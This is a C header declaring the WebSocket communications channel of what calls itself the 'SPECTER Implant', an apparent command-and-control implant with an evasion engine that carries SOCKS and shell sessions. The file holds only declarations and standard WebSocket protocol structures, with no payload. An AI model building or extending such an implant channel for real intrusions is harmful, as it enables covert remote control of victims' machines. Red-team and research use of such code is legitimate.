/**
 * SPECTER Implant — WebSocket Communications Channel Interface
 *
 * RFC 6455 WebSocket client with HTTP Upgrade handshake, frame
 * construction/parsing (text, binary, ping, pong, close), client
 * masking, and payload fragmentation.  WSS via existing SChannel TLS
 * infrastructure.  Use case: interactive sessions (SOCKS, shell)
 * where HTTP polling is too slow; falls back to HTTP if disrupted.
 * All network operations go through the evasion engine.
 */

#ifndef COMMS_WS_H
#define COMMS_WS_H

#include "specter.h"
#include "comms.h"
#include "config.h"

/* ------------------------------------------------------------------ */
/*  Constants                                                          */
/* ------------------------------------------------------------------ */

/* WebSocket frame opcodes (RFC 6455 Section 5.2) */
#define WS_OPCODE_CONTINUATION  0x0
#define WS_OPCODE_TEXT          0x1
#define WS_OPCODE_BINARY        0x2
#define WS_OPCODE_CLOSE         0x8
#define WS_OPCODE_PING          0x9
#define WS_OPCODE_PONG          0xA

/* Frame flags */
#define WS_FIN_BIT              0x80    /* Final fragment flag        */
#define WS_MASK_BIT             0x80    /* Client masking required    */
#define WS_OPCODE_MASK          0x0F    /* Lower 4 bits = opcode     */

/* WebSocket buffer and limit constants */
#define WS_MAX_FRAME_HEADER     14      /* Max frame header size     */
#define WS_SEND_BUF_SIZE        4096    /* Outbound message buffer   */
#define WS_RECV_BUF_SIZE        8192    /* Inbound message buffer    */
#define WS_HANDSHAKE_BUF_SIZE   1024    /* HTTP upgrade buffer       */
#define WS_MAX_PAYLOAD_PER_FRAME 4000   /* Max payload per frame     */
#define WS_MASKING_KEY_SIZE     4       /* 32-bit masking key        */

/* WebSocket handshake constants */
#define WS_KEY_RAW_SIZE         16      /* 16 random bytes for key   */
#define WS_KEY_B64_SIZE         24      /* Base64-encoded key length */
#define WS_ACCEPT_RAW_SIZE      20      /* SHA-1 digest length       */
#define WS_ACCEPT_B64_SIZE      28      /* Base64 of SHA-1 digest    */

/* SHA-1 constants (used internally for Sec-WebSocket-Accept) */
#define WS_SHA1_BLOCK_SIZE      64
#define WS_SHA1_DIGEST_SIZE     20

/* WebSocket close status codes (RFC 6455 Section 7.4.1) */
#define WS_CLOSE_NORMAL         1000
#define WS_CLOSE_GOING_AWAY     1001
#define WS_CLOSE_PROTOCOL_ERROR 1002

/* WebSocket connection state */
#define WS_STATE_DISCONNECTED   0
#define WS_STATE_TCP_CONNECTED  1
#define WS_STATE_TLS_CONNECTED  2
#define WS_STATE_UPGRADED       3       /* Handshake complete        */
#define WS_STATE_CLOSING        4
#define WS_STATE_ERROR          5

/* ------------------------------------------------------------------ */
/*  WebSocket frame structure (parsed)                                 */
/* ------------------------------------------------------------------ */

typedef struct _WS_FRAME {
    BYTE   opcode;                      /* Frame opcode              */
    BOOL   fin;                         /* Final fragment flag        */
    BOOL   masked;                      /* Mask bit set              */
    BYTE   mask_key[WS_MASKING_KEY_SIZE]; /* Masking key             */
    DWORD  payload_len;                 /* Payload length            */
    BYTE  *payload;                     /* Pointer to payload data   */
} WS_FRAME;

/* ------------------------------------------------------------------ */
/*  WS_CONTEXT — WebSocket channel state                               */
/* ------------------------------------------------------------------ */

typedef struct _WS_CONTEXT {
    COMMS_CONTEXT  tls;                 /* Underlying TLS connection  */
    DWORD          ws_state;            /* WS_STATE_* enum            */

    /* Handshake state */
    BYTE           ws_key_raw[WS_KEY_RAW_SIZE];   /* Random key bytes */
    char           ws_key_b64[WS_KEY_B64_SIZE + 1]; /* Base64 key    */
    char           expected_accept[WS_ACCEPT_B64_SIZE + 1]; /* Expected Accept */

    /* PRNG state for masking keys */
    DWORD          prng_state;

    /* Buffers */
    BYTE           send_buf[WS_SEND_BUF_SIZE];
    BYTE           recv_buf[WS_RECV_BUF_SIZE];
    BYTE           handshake_buf[WS_HANDSHAKE_BUF_SIZE];

    /* Session key (shared with main comms for AEAD encryption) */
    BYTE           session_key[32];
    DWORD          msg_seq;

    /* Connection state (mirrors COMMS_STATE for channel interface) */
    COMMS_STATE    state;
} WS_CONTEXT;

/* ------------------------------------------------------------------ */
/*  SHA-1 (minimal, for Sec-WebSocket-Accept only)                     */
/* ------------------------------------------------------------------ */

typedef struct _WS_SHA1_CTX {
    DWORD  state[5];
    QWORD  count;
    BYTE   buffer[WS_SHA1_BLOCK_SIZE];
    DWORD  buf_len;
} WS_SHA1_CTX;

/**
 * SHA-1 hash functions (RFC 3174).
 * Used internally for WebSocket Sec-WebSocket-Accept computation.
 */
void ws_sha1_init(WS_SHA1_CTX *ctx);
void ws_sha1_update(WS_SHA1_CTX *ctx, const BYTE *data, DWORD len);
void ws_sha1_final(WS_SHA1_CTX *ctx, BYTE digest[WS_SHA1_DIGEST_SIZE]);

/* ------------------------------------------------------------------ */
/*  Base64 encoding (minimal, for WebSocket key/accept)                */
/* ------------------------------------------------------------------ */

/**
 * Encode binary data to base64 (standard alphabet, with padding).
 * Returns number of characters written (excluding NUL), or 0 on error.
 */
DWORD ws_base64_encode(const BYTE *data, DWORD data_len,
                       char *output, DWORD output_len);

/**
 * Decode base64 string to binary.
 * Returns number of bytes written, or 0 on error.
 */
DWORD ws_base64_decode(const char *input, DWORD input_len,
                       BYTE *output, DWORD output_len);

/* ------------------------------------------------------------------ */
/*  WebSocket frame construction/parsing                               */
/* ------------------------------------------------------------------ */

/**
 * Build a WebSocket frame with the given opcode and payload.
 * Client frames are always masked per RFC 6455.
 * Returns total frame size written to output, or 0 on error.
 */
DWORD ws_build_frame(WS_CONTEXT *ctx, BYTE opcode, BOOL fin,
                     const BYTE *payload, DWORD payload_len,
                     BYTE *output, DWORD output_len);

/**
 * Parse a WebSocket frame from wire data.
 * Fills in frame structure; frame->payload points into wire_data.
 * Returns number of bytes consumed, or 0 on error/incomplete.
 */
DWORD ws_parse_frame(const BYTE *wire_data, DWORD wire_len,
                     WS_FRAME *frame);

/**
 * Apply/remove XOR mask to payload data (in-place).
 * Same operation for masking and unmasking.
 */
void ws_apply_mask(BYTE *data, DWORD data_len, const BYTE mask_key[4]);

/* ------------------------------------------------------------------ */
/*  WebSocket handshake                                                */
/* ------------------------------------------------------------------ */

/**
 * Generate a random 16-byte WebSocket key and compute the expected
 * Sec-WebSocket-Accept value (SHA-1 of key + GUID, base64-encoded).
 */
void ws_generate_key(WS_CONTEXT *ctx);

/**
 * Build the HTTP Upgrade request for WebSocket handshake.
 * Returns bytes written to output, or 0 on error.
 */
DWORD ws_build_upgrade_request(WS_CONTEXT *ctx, const char *host,
                               const char *path,
                               BYTE *output, DWORD output_len);

/**
 * Validate the server's HTTP 101 response and Sec-WebSocket-Accept.
 * Returns TRUE if handshake is valid.
 */
BOOL ws_validate_upgrade_response(WS_CONTEXT *ctx,
                                  const BYTE *response, DWORD response_len);

/* ------------------------------------------------------------------ */
/*  Channel interface                                                  */
/* ------------------------------------------------------------------ */

/**
 * Initialize and connect the WebSocket channel.
 * TCP connect → TLS handshake → HTTP Upgrade → WebSocket ready.
 */
NTSTATUS ws_connect(IMPLANT_CONTEXT *ctx);

/**
 * Send data over the WebSocket channel (binary frame, masked).
 */
NTSTATUS ws_send(IMPLANT_CONTEXT *ctx, const BYTE *data, DWORD len);

/**
 * Receive data from the WebSocket channel.
 * Handles control frames (ping→pong, close) transparently.
 * data_out: output buffer, data_len: in=buffer size, out=bytes received.
 */
NTSTATUS ws_recv(IMPLANT_CONTEXT *ctx, BYTE *data_out, DWORD *data_len);

/**
 * Send close frame and disconnect the WebSocket channel.
 */
NTSTATUS ws_disconnect(IMPLANT_CONTEXT *ctx);

/**
 * Health check: send a ping frame, expect a pong response.
 */
NTSTATUS ws_health_check(IMPLANT_CONTEXT *ctx);

/* ------------------------------------------------------------------ */
/*  Test support                                                       */
/* ------------------------------------------------------------------ */

#ifdef TEST_BUILD
WS_CONTEXT *ws_get_context(void);
void ws_test_set_prng_seed(WS_CONTEXT *ctx, DWORD seed);
void ws_test_reset_context(WS_CONTEXT *ctx);
#endif

#endif /* COMMS_WS_H */
